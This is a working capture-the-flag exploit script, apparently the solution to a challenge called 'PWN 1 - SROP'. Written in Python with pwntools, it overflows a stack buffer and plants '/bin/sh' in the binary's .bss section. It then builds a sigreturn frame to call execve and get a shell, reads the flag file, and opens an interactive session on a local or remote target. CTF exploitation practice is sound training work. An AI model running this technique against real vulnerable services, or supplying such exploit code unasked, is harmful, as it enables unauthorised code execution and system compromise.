#!/usr/bin/env python3
# PWN 1 - SROP.  Works local and remote:
#   python3 solve.py                      # local ./chal
#   python3 solve.py REMOTE HOST=1.2.3.4 PORT=5500
from pwn import *

context.clear(arch='amd64', os='linux')
exe = args.BIN or '../public/chall'
elf = context.binary = ELF(exe, checksec=False)

OFFSET  = 0x28                  # char buf[0x20] + saved rbp
POP_RAX = elf.sym['gadgets']    # pop rax ; ret
SYSCALL = POP_RAX + 2           # syscall ; ret
BINSH   = elf.sym['g_name']     # .bss, fixed (no PIE) - we plant the string there
STACK   = elf.bss(0x400)        # any mapped writable address for the restored rsp

log.info('pop rax ; ret   %#x', POP_RAX)
log.info('syscall ; ret   %#x', SYSCALL)
log.info('g_name          %#x', BINSH)

io = remote(args.HOST or 'localhost', int(args.PORT or 5500)) if args.REMOTE else process(exe)

# --- 1) plant "/bin/sh\0" at a constant address -----------------------------
io.sendlineafter(b'> ', b'1')
io.sendafter(b'name (16): ', b'/bin/sh\0')

# --- 2) SROP: execve("/bin/sh", NULL, NULL) ---------------------------------
frame      = SigreturnFrame()
frame.rax  = constants.SYS_execve       # 59
frame.rdi  = BINSH
frame.rsi  = 0
frame.rdx  = 0
frame.rip  = SYSCALL
frame.rsp  = STACK
# amd64 sigcontext packs cs/gs/fs into one qword; cs=0x33 (64-bit user code).
# SS is not part of the frame - the kernel forces it to 0x2b on sigreturn.
frame.csgsfs = 0x33
assert len(bytes(frame)) == 248, len(bytes(frame))

payload  = b'A' * OFFSET
payload += p64(POP_RAX) + p64(constants.SYS_rt_sigreturn)   # rax = 15
payload += p64(SYSCALL)                                     # kernel restores the frame
payload += bytes(frame)
assert len(payload) == OFFSET + 24 + 248 == 312
assert len(payload) <= 0x400

io.sendlineafter(b'> ', b'2')
io.sendafter(b'message: ', payload)

io.sendline(b'id; cat /app/flag.txt flag.txt /flag.txt 2>/dev/null')
print(io.recvrepeat(1.5).decode(errors='replace'), end='')
io.interactive()
